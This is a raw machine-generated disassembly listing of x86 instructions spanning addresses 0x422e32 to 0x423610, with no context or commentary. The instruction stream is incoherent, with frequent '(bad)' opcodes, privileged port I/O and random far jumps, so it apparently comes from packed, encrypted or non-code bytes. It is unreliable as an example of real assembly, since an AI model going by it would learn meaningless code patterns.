  422e32:	leave  
  422e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e34:	ds call 0x7dd2c2bf
  422e3a:	push   edi
  422e3b:	fst    st(0)
  422e3d:	adc    BYTE PTR [esi+edi*8+0x2ee60244],0x71
  422e45:	lock push cs
  422e47:	hlt    
  422e48:	in     eax,dx
  422e49:	add    BYTE PTR [esi+esi*4],cl
  422e4c:	jns    0x422e4b
  422e4e:	pop    ss
  422e4f:	lods   al,BYTE PTR ds:[esi]
  422e50:	inc    eax
  422e51:	xchg   ebx,eax
  422e52:	loop   0x422e62
  422e54:	or     ecx,edx
  422e56:	test   DWORD PTR [eax+0x7dd6fe45],ecx
  422e5c:	dec    DWORD PTR [edi+0x79cb7eeb]
  422e62:	mov    ds:0xebafc6a6,al
  422e67:	retf   
  422e68:	mov    bl,0xe4
  422e6a:	sub    eax,0x541832fa
  422e6f:	into   
  422e70:	arpl   bp,sp
  422e72:	(bad)  
  422e74:	sub    esp,esi
  422e76:	mov    ds:0xc84a5dae,eax
  422e7b:	sahf   
  422e7c:	(bad)  
  422e7e:	adc    eax,0x85ee2320
  422e83:	jle    0x422e39
  422e85:	xchg   DWORD PTR [edi+0x6000099c],eax
  422e8b:	in     eax,0xee
  422e8d:	mov    eax,ds:0x14fa574b
  422e92:	fsubr  DWORD PTR [esi+0x1cc511c9]
  422e98:	pop    ss
  422e99:	inc    esi
  422e9a:	call   0xec1ba25a
  422e9f:	stos   BYTE PTR es:[edi],al
  422ea0:	(bad)  
  422ea1:	outs   dx,DWORD PTR ds:[esi]
  422ea2:	adc    eax,0x33f7ea4f
  422ea7:	xchg   ebp,eax
  422ea8:	hlt    
  422ea9:	lds    ebp,FWORD PTR fs:[ecx+0x29]
  422ead:	(bad)  
  422eae:	xor    al,0xd3
  422eb0:	fld    TBYTE PTR [edx+0x14df2cd9]
  422eb6:	lods   eax,DWORD PTR ds:[esi]
  422eb7:	add    eax,0xcb5d47bc
  422ebc:	or     dl,dl
  422ebe:	popa   
  422ebf:	mov    eax,ds:0x3cd86cbe
  422ec4:	mov    ah,0xe8
  422ec6:	push   ss
  422ec7:	or     BYTE PTR [ecx-0x1ea49091],ch
  422ecd:	xchg   edi,edx
  422ecf:	movaps XMMWORD PTR ds:0x235ca1c4,xmm0
  422ed6:	adc    ah,BYTE PTR [esi]
  422ed8:	cwde   
  422ed9:	cwde   
  422eda:	pusha  
  422edb:	aas    
  422edc:	out    0xa4,eax
  422ede:	idiv   esp
  422ee0:	cmp    DWORD PTR [esi],ebx
  422ee2:	mov    al,0x72
  422ee4:	inc    edi
  422ee5:	mov    eax,ds:0xb30da6e5
  422eea:	add    DWORD PTR [edi+0xb035029],edi
  422ef0:	sbb    bh,BYTE PTR [ebp-0x44]
  422ef3:	inc    edx
  422ef4:	ja     0x422f24
  422ef6:	xchg   esi,eax
  422ef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ef8:	int3   
  422ef9:	repz xor DWORD PTR ds:0xf2fe43e1,ecx
  422f00:	rol    DWORD PTR [ebx],cl
  422f02:	xor    BYTE PTR [ebx-0x6e],ah
  422f05:	jle    0x422f19
  422f07:	xchg   al,dl
  422f09:	sti    
  422f0a:	cmp    eax,0xb8a2f068
  422f0f:	and    eax,0x9fcb46e2
  422f14:	scas   eax,DWORD PTR es:[edi]
  422f15:	in     eax,0x2a
  422f17:	imul   eax,DWORD PTR [ebx+0x3d],0x7d444cf8
  422f1e:	pop    es
  422f1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f20:	test   al,0xf8
  422f22:	sub    DWORD PTR [ebp+eiz*2-0x52],edx
  422f26:	ins    DWORD PTR es:[edi],dx
  422f27:	add    ecx,esi
  422f29:	xchg   ecx,eax
  422f2a:	addr16 fcmovbe st,st(4)
  422f2d:	mov    dh,0xb2
  422f2f:	sar    bh,1
  422f31:	pushf  
  422f32:	pop    edi
  422f33:	daa    
  422f34:	pop    ss
  422f35:	ror    DWORD PTR [eax-0x739368d7],1
  422f3b:	mov    ecx,esp
  422f3d:	pusha  
  422f3e:	sbb    cl,BYTE PTR [ebx]
  422f40:	mov    esp,DWORD PTR [ecx+0x47]
  422f43:	cdq    
  422f44:	out    0xcc,eax
  422f46:	inc    ecx
  422f47:	and    ecx,DWORD PTR [ebp-0x5e]
  422f4a:	lock gs jle 0x422ee1
  422f4e:	sahf   
  422f4f:	pop    esi
  422f50:	mov    ah,0x13
  422f52:	enter  0xb310,0xf2
  422f56:	clc    
  422f57:	iret   
  422f58:	xor    eax,0x33e0b51d
  422f5d:	mov    edx,0x95b32f25
  422f62:	aaa    
  422f63:	lea    edx,[ebx-0x2e6d3ae]
  422f69:	arpl   WORD PTR [edi+esi*2+0x49602231],sp
  422f70:	and    edi,ebx
  422f72:	inc    eax
  422f73:	sbb    BYTE PTR [edi+edi*8-0x58],dl
  422f77:	push   ecx
  422f78:	sub    ebx,DWORD PTR [edx-0x3ee769fa]
  422f7e:	and    al,0xbf
  422f80:	sbb    edx,DWORD PTR [edx]
  422f82:	daa    
  422f83:	ja     0x422fef
  422f85:	aam    0x2f
  422f87:	mov    ecx,0x5cb53a9c
  422f8c:	add    DWORD PTR [ecx],eax
  422f8e:	lahf   
  422f8f:	retf   
  422f90:	add    BYTE PTR [ecx-0x43],ch
  422f93:	add    DWORD PTR [edi-0x7c],eax
  422f96:	fnstsw WORD PTR [ebx+0x6af4ac4]
  422f9c:	xchg   ebp,eax
  422f9d:	or     cl,BYTE PTR [eax+0x35c579c]
  422fa3:	jns    0x422ff2
  422fa5:	inc    edi
  422fa6:	dec    esp
  422fa7:	push   esp
  422fa8:	add    al,0xde
  422faa:	adc    eax,0x3bc238c0
  422faf:	adc    eax,0x12e9bda7
  422fb4:	shl    DWORD PTR [edi-0x192ab6af],1
  422fba:	dec    ebx
  422fbb:	push   ss
  422fbc:	sahf   
  422fbd:	(bad)
  422fc0:	push   es
  422fc1:	mov    ebx,0x1dde2d8b
  422fc6:	pop    ss
  422fc7:	and    ecx,ebx
  422fc9:	and    eax,DWORD PTR [esi]
  422fcb:	and    ch,BYTE PTR [edx+0x6948925a]
  422fd1:	sti    
  422fd2:	sub    BYTE PTR [edi+0x273109d0],0x6f
  422fd9:	scas   eax,DWORD PTR es:[edi]
  422fda:	pop    es
  422fdb:	ds jecxz 0x423046
  422fde:	add    bl,0xae
  422fe1:	aaa    
  422fe2:	dec    esi
  422fe3:	and    bh,BYTE PTR [eax]
  422fe5:	jge    0x423033
  422fe7:	inc    ebp
  422fe8:	add    BYTE PTR [eax],al
  422fea:	push   eax
  422feb:	dec    esi
  422fec:	dec    edi
  422fed:	push   esi
  422fee:	pop    edi
  422fef:	push   edi
  422ff0:	pop    ecx
  422ff1:	dec    esi
  422ff2:	idiv   BYTE PTR [ebx+0x53]
  422ff5:	jns    0x422ff4
  422ff7:	pop    ecx
  422ff9:	mov    ebp,0x1be8c
  422ffe:	xchg   BYTE PTR [esi],al
  423000:	add    BYTE PTR [eax],al
  423002:	test   eax,0xa935423a
  423007:	int3   
  423008:	pop    ss
  423009:	ins    DWORD PTR es:[edi],dx
  42300a:	xchg   ebp,eax
  42300b:	call   DWORD PTR [esi+0x7c]
  42300e:	jg     0x422fb7
  423010:	scas   al,BYTE PTR es:[edi]
  423011:	cmp    dh,BYTE PTR [edx+ebx*2]
  423014:	bound  ecx,QWORD PTR ds:0x9752b13e
  42301a:	jb     0x422fbb
  42301c:	pushf  
  42301d:	mov    ch,0x11
  42301f:	jp     0x42306e
  423021:	es sbb ch,dh
  423024:	addr16 jl 0x422fbc
  423027:	(bad)  
  423028:	and    ecx,DWORD PTR [esi]
  42302a:	cmp    BYTE PTR [ebx+0x0],0xe3
  42302e:	int    0x72
  423030:	push   es
  423031:	jg     0x423059
  423033:	(bad)  
  423034:	enter  0x743c,0x60
  423038:	outs   dx,DWORD PTR ds:[esi]
  423039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42303a:	pop    edx
  42303b:	or     BYTE PTR [eax+0x4e],0xdb
  42303f:	aas    
  423040:	cmp    BYTE PTR [eax],ah
  423042:	jb     0x423001
  423044:	scas   eax,DWORD PTR es:[edi]
  423045:	push   ebx
  423046:	inc    esp
  423047:	fcmovb st,st(6)
  423049:	lahf   
  42304a:	jnp    0x423060
  42304c:	repnz cmp DWORD PTR [eax*4+0x3c71df29],0xffffffa4
  423055:	xor    edx,DWORD PTR [esi-0x74]
  423058:	not    BYTE PTR [eax]
  42305a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42305b:	ins    BYTE PTR es:[edi],dx
  42305c:	and    eax,edi
  42305e:	and    BYTE PTR [edi+0x704f0c60],cl
  423064:	into   
  423065:	inc    ecx
  423066:	call   0x6f4e:0x577d3b2b
  42306d:	shr    BYTE PTR [ecx+eiz*8],1
  423070:	inc    ebp
  423071:	xor    dl,dh
  423073:	and    eax,0x16f9247e
  423078:	icebp  
  423079:	and    DWORD PTR [eax],esp
  42307b:	mov    ebp,0x7ffd4c9
  423080:	jb     0x42307d
  423082:	dec    edx
  423083:	out    0xf2,eax
  423085:	push   cs
  423086:	dec    eax
  423087:	outs   dx,BYTE PTR ds:[esi]
  423088:	mov    cl,bl
  42308a:	jge    0x42306d
  42308c:	popa   
  42308d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42308e:	in     al,0x27
  423090:	and    BYTE PTR [ecx],0xe5
  423093:	adc    cl,BYTE PTR [esi]
  423095:	or     DWORD PTR [esi],ebx
  423097:	fwait
  423098:	outs   dx,BYTE PTR ds:[esi]
  423099:	dec    esi
  42309a:	mov    al,ds:0xeb652c98
  42309f:	lahf   
  4230a0:	jg     0x423116
  4230a2:	push   edi
  4230a3:	adc    al,0x35
  4230a5:	fistp  QWORD PTR [edx+0x20efaeb0]
  4230ab:	addr16 push eax
  4230ad:	loopne 0x42310a
  4230af:	cmp    DWORD PTR [ebp-0x30],edi
  4230b2:	mov    ah,0x1e
  4230b4:	push   esp
  4230b5:	xor    al,0x6
  4230b7:	push   0xbf0ab374
  4230bc:	inc    ebp
  4230bd:	jae    0x4230b8
  4230bf:	leave  
  4230c0:	mov    ah,0x39
  4230c2:	mov    esi,0xe8981aeb
  4230c7:	inc    ebx
  4230c8:	addr16 cwde 
  4230ca:	add    esi,DWORD PTR [ecx+0x7c]
  4230cd:	cld    
  4230ce:	mov    ebp,0xd1c161c1
  4230d3:	pop    es
  4230d4:	mov    ecx,0xf96b787e
  4230d9:	popa   
  4230da:	adc    ebx,ebx
  4230dc:	add    BYTE PTR [edx-0x1c],ch
  4230df:	inc    ebx
  4230e0:	stos   DWORD PTR es:[edi],eax
  4230e1:	mov    ebx,0xb8622f7c
  4230e6:	push   0xfa2a87cb
  4230eb:	leave  
  4230ec:	repnz aam 0x6e
  4230ef:	cmp    BYTE PTR [eax+0x10],al
  4230f2:	push   eax
  4230f3:	sub    al,0xfd
  4230f5:	out    dx,al
  4230f6:	les    eax,FWORD PTR [edx+edx*8+0x72]
  4230fa:	dec    edx
  4230fb:	int    0x8b
  4230fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230fe:	cmp    edx,esp
  423100:	inc    cx
  423102:	push   edx
  423103:	int    0xb7
  423105:	cs push ds
  423107:	icebp  
  423108:	sub    ch,al
  42310a:	jne    0x423143
  42310c:	arpl   dx,bx
  42310e:	popf   
  42310f:	out    dx,ax
  423111:	loop   0x423129
  423113:	hlt    
  423114:	add    BYTE PTR [edx-0x5d593efb],0x14
  42311b:	(bad)  
  42311c:	sahf   
  42311d:	test   eax,0x559a8940
  423122:	mov    al,ds:0x6725241c
  423127:	and    eax,0xb846d4ba
  42312c:	xchg   edx,eax
  42312d:	mov    ds:0xc6c24606,al
  423132:	xor    eax,0x455d4d8a
  423137:	push   esp
  423138:	jo     0x4230d3
  42313a:	scas   eax,DWORD PTR es:[edi]
  42313b:	pop    ss
  42313c:	add    ch,BYTE PTR [ecx+0x184822ee]
  423142:	add    eax,0x9e833cf
  423147:	xor    eax,0x231a40f8
  42314c:	scas   al,BYTE PTR es:[edi]
  42314d:	mov    ah,0xe7
  42314f:	pusha  
  423150:	arpl   WORD PTR [ebx-0x5eb13a54],di
  423156:	adc    bl,BYTE PTR [esp+eiz*8]
  423159:	dec    ebp
  42315a:	sub    eax,ecx
  42315c:	add    ebx,eax
  42315e:	xchg   ebp,eax
  42315f:	jp     0x42315b
  423161:	div    BYTE PTR [ecx-0x6b6a2387]
  423167:	cmc    
  423168:	inc    esp
  423169:	pop    esp
  42316a:	add    eax,0x7068424f
  42316f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423170:	loopne 0x423177
  423172:	mov    ecx,0x697b515e
  423177:	mov    ecx,0xa6c88192
  42317c:	mov    ds:0xf3706e94,eax
  423181:	pop    ebx
  423182:	fldz   
  423184:	aad    0xa2
  423186:	jne    0x4231a9
  423188:	adc    bh,BYTE PTR [eax]
  42318a:	inc    BYTE PTR [edi-0x1a78ad1b]
  423190:	mov    esp,0x3d88e1ae
  423195:	xor    al,0x8a
  423197:	jmp    ebp
  423199:	xlat   BYTE PTR ds:[ebx]
  42319a:	and    BYTE PTR [esp+0x51d9defb],dl
  4231a1:	cmp    esp,DWORD PTR [ebx]
  4231a3:	mov    bl,0x35
  4231a5:	ret    0x74c4
  4231a8:	adc    al,0x80
  4231aa:	inc    esi
  4231ab:	inc    ebx
  4231ac:	into   
  4231ad:	adc    dl,al
  4231af:	leave  
  4231b0:	inc    ebp
  4231b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231b2:	dec    esp
  4231b3:	in     al,dx
  4231b4:	test   al,0x4e
  4231b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231b7:	push   0xa019f29b
  4231bc:	scas   eax,DWORD PTR es:[edi]
  4231bd:	jge    0x423155
  4231bf:	jmp    0xbafe9aac
  4231c4:	cmp    BYTE PTR [esi],0x4c
  4231c7:	mov    dl,0xba
  4231c9:	(bad)  
  4231ca:	xchg   ebx,eax
  4231cb:	add    eax,0x345bb18f
  4231d0:	push   ebp
  4231d1:	push   0x4423fe7a
  4231d6:	enter  0xf99c,0xcb
  4231da:	rol    BYTE PTR [edx+0x48],0xe3
  4231de:	loopne 0x423187
  4231e0:	sar    bl,0xb
  4231e3:	push   ss
  4231e4:	(bad)  
  4231e5:	sub    esi,DWORD PTR [eax+0x43a917d5]
  4231eb:	out    dx,eax
  4231ec:	sbb    DWORD PTR [ebx-0x2b],esp
  4231ef:	cmp    eax,0x1246844c
  4231f4:	dec    ebx
  4231f5:	mov    ebx,0xbb624f8f
  4231fa:	ret    0xe915
  4231fd:	sub    edx,DWORD PTR [ecx]
  4231ff:	into   
  423200:	mov    dl,bh
  423202:	iret   
  423203:	pop    ebx
  423204:	mov    edi,0x63c8c80b
  423209:	add    BYTE PTR [eax+0x1f8e6e6],ah
  42320f:	imul   ecx,DWORD PTR [eax],0xfffffffa
  423212:	pop    ds
  423213:	cmp    al,0x6a
  423215:	adc    edx,edi
  423217:	xchg   edi,eax
  423218:	pop    ds
  423219:	test   al,0x39
  42321b:	pop    ebx
  42321c:	sub    al,0x33
  42321e:	add    ecx,ebx
  423220:	xor    eax,0x3cf753ca
  423225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423226:	fisubr WORD PTR [edx-0x139a9360]
  42322c:	fld    DWORD PTR [esp+esi*2+0x27]
  423230:	push   esi
  423231:	loop   0x42321c
  423233:	cli    
  423234:	fwait
  423235:	mov    al,ds:0xe6adbb9
  42323a:	or     al,0xbc
  42323c:	mov    esi,0x893d7045
  423241:	arpl   WORD PTR [ebp+0x3c],bx
  423244:	add    bh,cl
  423246:	test   ebp,edi
  423248:	push   0x423386f2
  42324d:	xchg   BYTE PTR [edi],ah
  42324f:	cdq    
  423250:	xchg   ebx,eax
  423251:	pop    es
  423252:	test   BYTE PTR [ecx+0x76],cl
  423255:	test   BYTE PTR [ecx+0x54],ah
  423258:	inc    ecx
  423259:	pop    ss
  42325a:	jp     0x4231f5
  42325c:	dec    edx
  42325d:	ret    0x3a40
  423260:	xor    DWORD PTR [eax+0x1a],edx
  423263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423264:	icebp  
  423265:	not    BYTE PTR [ecx+0x24]
  423268:	test   eax,0x1291f146
  42326d:	popa   
  42326e:	in     eax,0x92
  423270:	int    0xfb
  423272:	push   es
  423273:	or     BYTE PTR [ecx+0x5c],0xc4
  423277:	sub    eax,0xb7c689cf
  42327c:	mov    esi,0xa5e0200
  423281:	mov    bl,0x90
  423283:	das    
  423284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423285:	push   ss
  423286:	xchg   esp,eax
  423287:	shl    DWORD PTR [edi+0x47954719],1
  42328d:	push   ebp
  42328e:	(bad)  
  42328f:	cli    
  423290:	push   edx
  423291:	jmp    0x4232d0
  423293:	and    BYTE PTR [ebp+0x35e012cb],cl
  423299:	pushf  
  42329a:	pusha  
  42329b:	aam    0x4e
  42329d:	mov    al,0xa0
  42329f:	push   ebx
  4232a0:	ins    DWORD PTR es:[edi],dx
  4232a1:	and    edx,edx
  4232a3:	add    al,BYTE PTR [edx+0x4e]
  4232a6:	jl     0x4232d4
  4232a8:	dec    edi
  4232a9:	pusha  
  4232aa:	push   ebp
  4232ab:	mov    eax,0x5d453756
  4232b0:	cwde   
  4232b1:	cs jmp 0x3da9:0x4bbedace
  4232b9:	adc    eax,0x993b710b
  4232be:	mov    ds:0xe1f664f9,eax
  4232c3:	lea    ecx,[esi-0x74]
  4232c6:	jb     0x4232e7
  4232c8:	aas    
  4232c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232ca:	arpl   WORD PTR [ebx-0x5a2cb29b],bp
  4232d0:	xor    dl,al
  4232d2:	jnp    0x4232f1
  4232d4:	ins    DWORD PTR es:[edi],dx
  4232d5:	sub    al,0xfe
  4232d7:	jne    0x423275
  4232d9:	(bad)  
  4232da:	add    ebp,DWORD PTR ds:0xee2196cd
  4232e0:	in     al,0x94
  4232e2:	imul   edx,DWORD PTR [edx+0x1a],0x7198ef58
  4232e9:	mov    edx,0x2cdf76e1
  4232ee:	xchg   ebp,eax
  4232ef:	pop    edx
  4232f0:	mov    ebp,ebx
  4232f2:	lds    ebx,FWORD PTR [esi]
  4232f4:	xchg   edx,eax
  4232f5:	and    bl,ah
  4232f7:	dec    ebx
  4232f8:	mov    esp,0xc7691253
  4232fd:	mov    cl,bl
  4232ff:	and    DWORD PTR [eax+ecx*1+0x6b],ecx
  423303:	push   0xfffffff2
  423305:	jecxz  0x4232a1
  423307:	adc    ebp,DWORD PTR [ebx]
  423309:	and    eax,0x966568d4
  42330e:	dec    esp
  42330f:	and    DWORD PTR [eax],ebp
  423311:	mov    eax,ds:0x2e31793c
  423316:	into   
  423317:	mov    ebx,cs
  423319:	retf   0x2601
  42331c:	mov    dh,BYTE PTR [ecx-0x7db1e66e]
  423322:	and    eax,0x13819f73
  423327:	jmp    0x423339
  423329:	(bad)  
  42332b:	retf   0xdac4
  42332e:	xor    eax,0xd981429b
  423333:	jmp    0x733e7724
  423338:	fadd   QWORD PTR [ebx+0x35]
  42333b:	mov    al,es:0xd0894443
  423341:	ja     0x4233a4
  423343:	jmp    0x423326
  423345:	mov    ch,0x4f
  423347:	sbb    bl,BYTE PTR [edi+edi*4-0x33]
  42334b:	push   0x7d753ce6
  423350:	adc    BYTE PTR [edi+edi*2+0x7e0ebbfb],bl
  423357:	add    eax,0x43d034bc
  42335c:	jne    0x42335a
  42335e:	add    BYTE PTR [eax-0xe],bh
  423361:	inc    edx
  423362:	js     0x423364
  423364:	cs repnz pop ebx
  423367:	loope  0x4233be
  423369:	dec    esi
  42336b:	fadd   DWORD PTR [edx]
  42336d:	in     al,0x4e
  42336f:	cwde   
  423370:	push   0xf5860d5
  423375:	xor    eax,DWORD PTR [ebx*4-0x20199643]
  42337c:	(bad)  
  42337d:	cmp    eax,0xa965a7ed
  423382:	and    DWORD PTR [ecx],esi
  423384:	pop    edx
  423385:	arpl   WORD PTR [ecx-0x55],bx
  423388:	xor    al,0x3d
  42338a:	pop    edx
  42338b:	test   BYTE PTR [ecx+0x678ab11e],0xa5
  423392:	cld    
  423393:	leave  
  423394:	pusha  
  423395:	out    0xe2,eax
  423397:	clc    
  423398:	(bad)  
  423399:	xlat   BYTE PTR ds:[ebx]
  42339a:	pusha  
  42339b:	test   al,0xbf
  42339d:	mov    BYTE PTR [ebx-0x20],ah
  4233a0:	fbld   TBYTE PTR [edx+0x49]
  4233a3:	out    dx,al
  4233a4:	push   cs
  4233a5:	mov    cl,0x11
  4233a7:	shl    DWORD PTR [edx+esi*2-0x55],1
  4233ab:	aaa    
  4233ac:	mov    ?,eax
  4233ae:	dec    esp
  4233af:	test   BYTE PTR [edi],cl
  4233b1:	inc    esp
  4233b2:	pushf  
  4233b3:	outs   dx,BYTE PTR ds:[esi]
  4233b4:	adc    BYTE PTR [edx-0x4b4e087],bh
  4233ba:	mov    cl,0x98
  4233bc:	faddp  st(1),st
  4233be:	push   0xf325f61b
  4233c3:	js     0x423433
  4233c5:	jmp    0x2c6c4c36
  4233ca:	lods   al,BYTE PTR ds:[esi]
  4233cb:	mov    bl,0x6d
  4233cd:	mov    dh,0x32
  4233cf:	dec    ecx
  4233d0:	adc    ebx,DWORD PTR [esi+0x43a15e59]
  4233d6:	mov    ah,BYTE PTR [edi+0x374fe4a8]
  4233dc:	aam    0x4c
  4233de:	add    eax,0xe1674e78
  4233e3:	jle    0x423366
  4233e5:	and    al,0xb3
  4233e7:	push   0xffffffff
  4233e9:	cwde   
  4233ea:	cs js  0x42343a
  4233ed:	shr    ah,0x2b
  4233f0:	adc    eax,0x10dd9557
  4233f5:	pop    edx
  4233f6:	fcmovbe st,st(2)
  4233f8:	mov    dl,BYTE PTR [esi-0x61]
  4233fb:	sbb    eax,0xd10668a
  423400:	mov    esi,0x3d3baacd
  423405:	jae    0x42345b
  423407:	jbe    0x423477
  423409:	pushf  
  42340a:	aam    0x74
  42340c:	ret    
  42340d:	les    esp,FWORD PTR [ebx]
  42340f:	jecxz  0x423398
  423411:	cmp    DWORD PTR [ebp+0x62d83232],0xffffff81
  423418:	into   
  423419:	retf   
  42341a:	pusha  
  42341b:	retf   
  42341c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42341d:	(bad)  
  42341e:	cmp    dl,BYTE PTR ds:0x8252fc9d
  423424:	jo     0x4233ae
  423426:	arpl   WORD PTR [esi],bx
  423428:	popf   
  423429:	in     eax,dx
  42342a:	adc    DWORD PTR [esi-0x196fc53b],esi
  423430:	or     eax,0xdef0379e
  423435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423436:	xchg   ebx,eax
  423437:	(bad)  
  423438:	sbb    ecx,DWORD PTR es:[edx+0x47be321b]
  42343f:	mov    cl,0xab
  423441:	mov    cl,0x36
  423443:	or     BYTE PTR ds:0xde8a33af,bl
  423449:	jmp    0xf246:0x641c11b
  423450:	push   ss
  423451:	(bad)  
  423452:	call   0x19d3:0xcfda9520
  423459:	mov    ch,0x79
  42345b:	xchg   ebx,eax
  42345c:	jno    0x4233f4
  42345e:	lods   al,BYTE PTR ds:[esi]
  42345f:	inc    esp
  423460:	sub    al,0xbd
  423462:	mov    eax,ds:0x800862f4
  423467:	rcr    ah,1
  423469:	dec    ebp
  42346a:	mov    bl,0xcf
  42346c:	inc    ebp
  42346d:	add    al,0xf7
  42346f:	mov    al,ds:0x5991be27
  423474:	(bad)
  423479:	fs mov bl,ch
  42347c:	fsubr  st(6),st
  42347e:	xchg   ebp,eax
  42347f:	xchg   edi,eax
  423480:	mov    cl,0xa1
  423482:	cwde   
  423483:	loope  0x423449
  423485:	aaa    
  423486:	dec    esp
  423487:	sbb    ebx,DWORD PTR [edx]
  423489:	sbb    eax,0x1b05325
  42348e:	not    BYTE PTR [edi]
  423490:	cs sbb al,0xe7
  423493:	xchg   esi,eax
  423494:	jae    0x4234bc
  423496:	xor    eax,0x914ea460
  42349b:	jp     0x4234d9
  42349d:	xor    BYTE PTR [esi+ebp*8],ah
  4234a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234a1:	jmp    0xcf5e:0x439511ed
  4234a8:	int3   
  4234a9:	sbb    bh,al
  4234ab:	mov    DWORD PTR [ebp-0x7c99faa7],edi
  4234b1:	(bad)  
  4234b2:	sahf   
  4234b3:	xchg   esi,eax
  4234b4:	sbb    ebx,edi
  4234b6:	neg    DWORD PTR [ebp-0x595787da]
  4234bc:	push   ecx
  4234bd:	outs   dx,DWORD PTR ds:[esi]
  4234be:	pop    esi
  4234bf:	jp     0x423513
  4234c1:	or     esp,DWORD PTR [ecx-0xaf256e5]
  4234c7:	ins    BYTE PTR es:[edi],dx
  4234c8:	jle    0x423461
  4234ca:	lods   al,BYTE PTR ds:[esi]
  4234cb:	xor    dh,BYTE PTR cs:[esi+0x33]
  4234cf:	shr    BYTE PTR [ebx+0x136208c1],cl
  4234d5:	sahf   
  4234d6:	das    
  4234d7:	inc    edi
  4234d8:	mov    edx,0x3d844d85
  4234dd:	out    dx,al
  4234de:	lahf   
  4234df:	call   0xfb4e2e9f
  4234e4:	mov    ds:0x17b0acc5,eax
  4234e9:	mov    bh,0x89
  4234eb:	les    edx,FWORD PTR [edx-0x1d]
  4234ee:	popa   
  4234ef:	jb     0x42349d
  4234f1:	ret    0xbd75
  4234f4:	lahf   
  4234f5:	xor    dh,BYTE PTR [edi+0x69]
  4234f8:	sbb    DWORD PTR [ebp+0x1a8d3cfd],0x20
  4234ff:	shr    DWORD PTR [ecx+ecx*4],cl
  423502:	pop    esi
  423503:	jmp    0x423556
  423505:	loope  0x42349d
  423507:	pop    ebx
  423508:	mov    ds:0x4cd5ff7a,eax
  42350d:	int    0x31
  42350f:	push   es
  423510:	scas   eax,DWORD PTR es:[edi]
  423511:	or     BYTE PTR [ebp-0x473b1652],ah
  423517:	or     al,0x95
  423519:	outs   dx,BYTE PTR ds:[esi]
  42351a:	test   BYTE PTR [edx-0x7b382e04],cl
  423520:	repnz fucomi st,st(7)
  423523:	arpl   WORD PTR [esp+eax*1],bx
  423526:	xor    eax,0xaabe4341
  42352b:	jmp    0xe429:0x5f432c0d
  423532:	push   0xa2634c0d
  423537:	pop    ecx
  423538:	push   ebx
  423539:	js     0x42359a
  42353b:	sub    dl,cl
  42353d:	xchg   ebx,eax
  42353e:	mov    ds:0xd2b7e3fb,al
  423543:	mov    ah,0xd2
  423545:	inc    eax
  423546:	sar    DWORD PTR [ebx-0x30a3fbee],0x5b
  42354d:	aad    0x57
  42354f:	fcom   DWORD PTR [ebx-0x166eb5ff]
  423555:	mov    esp,0x1ed7c76f
  42355a:	clc    
  42355b:	pop    ebp
  42355c:	sbb    DWORD PTR [edx+0x1b],edx
  42355f:	repnz pop eax
  423561:	mov    edx,0x2e2c6218
  423566:	shl    esi,cl
  423568:	mov    dh,0x18
  42356a:	es pop ss
  42356c:	cmp    BYTE PTR [edi+0x1c],bl
  42356f:	and    esp,DWORD PTR [edx]
  423571:	sub    esp,DWORD PTR [esi+0x1b]
  423574:	fcmove st,st(4)
  423576:	mov    eax,0xc42a0b8b
  42357b:	cmp    al,0x6b
  42357d:	pop    es
  42357e:	mov    ah,0xa8
  423580:	lods   eax,DWORD PTR ds:[esi]
  423581:	cdq    
  423582:	das    
  423583:	sbb    BYTE PTR [ecx+eiz*1-0x1c],bh
  423587:	adc    cl,bl
  423589:	stos   BYTE PTR es:[edi],al
  42358a:	sub    eax,0x7ecf8859
  42358f:	mov    ds:0x3730b288,al
  423594:	xor    al,0x31
  423596:	cmp    al,0x41
  423598:	xchg   esi,eax
  423599:	jecxz  0x423522
  42359b:	js     0x423579
  42359d:	adc    eax,0x8619108
  4235a2:	sahf   
  4235a3:	mov    ebx,0xba650f44
  4235a8:	inc    ebx
  4235a9:	je     0x4235a5
  4235ab:	xchg   edi,eax
  4235ac:	push   edx
  4235ad:	mov    ah,BYTE PTR [edi]
  4235af:	jnp    0x423602
  4235b1:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4235b3:	add    BYTE PTR [esi+ecx*2-0x6d],0x15
  4235b8:	dec    esi
  4235b9:	mov    dh,0x65
  4235bb:	jnp    0x4235be
  4235bd:	loope  0x4235b4
  4235bf:	push   ss
  4235c0:	mov    ds:0xedfb86d,al
  4235c5:	stos   BYTE PTR es:[edi],al
  4235c6:	leave  
  4235c7:	cld    
  4235c8:	fwait
  4235c9:	imul   ecx,edx,0x1852e1a2
  4235cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235d0:	mov    BYTE PTR [ebx],ch
  4235d2:	mov    esi,DWORD PTR [edx]
  4235d4:	fcmovnu st,st(5)
  4235d6:	popa   
  4235d7:	jmp    0x5dfe:0x9c197b6
  4235de:	xor    eax,0x3d1f0821
  4235e3:	fs pop edi
  4235e5:	dec    ecx
  4235e6:	shl    DWORD PTR [edx],0x65
  4235e9:	pop    ebx
  4235ea:	fisub  DWORD PTR [eax]
  4235ec:	std    
  4235ed:	int    0xb9
  4235ef:	mov    dh,BYTE PTR [ebp-0x5701e040]
  4235f5:	and    ah,BYTE PTR ds:0x8da234e7
  4235fb:	das    
  4235fc:	enter  0xd388,0xa8
  423600:	jno    0x4235e2
  423602:	shr    BYTE PTR [ecx],0x3d
  423605:	in     al,dx
  423606:	fsubr  QWORD PTR [edi+eiz*8-0x33]
  42360a:	add    esp,DWORD PTR ss:[eax+0x60]
  42360e:	dec    edx
  42360f:	sahf   
  423610:	push   esp
